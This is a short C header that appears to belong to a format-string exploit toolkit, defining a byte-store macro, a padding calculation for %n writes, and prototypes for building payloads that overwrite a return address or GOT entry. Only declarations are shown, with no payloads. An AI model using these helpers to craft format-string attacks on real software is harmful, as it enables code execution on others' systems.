
#ifndef	FMTXP_H
#define	FMTXP_H

#define	STOR_QUAD(address,val) {  \
		(address)[0] = (val) & 0xff; \
		(address)[1] = ((val) >> 8) & 0xff; \
		(address)[2] = ((val) >> 16) & 0xff; \
		(address)[3] = ((val) >> 24) & 0xff; \
	}

#define	TOWCALC(rabyte,writtenc) ( \
	(((rabyte + 0x100) - (writtenc % 0x100)) % 0x100) < 10 ? \
		((((rabyte + 0x100) - (writtenc % 0x100)) % 0x100) + 0x100) : \
		(((rabyte + 0x100) - (writtenc % 0x100)) % 0x100) \
	)


int
xp_fmt_simple (int distance, unsigned long retloc, unsigned long retaddr,
	int written, unsigned char *dest, size_t dest_len);

int
xp_fmt_direct (int distance, unsigned long retaddr,
	int written, unsigned char *dest, size_t dest_len);

unsigned long int
xp_got_retrieve (char *pathname, char *name);

#endif

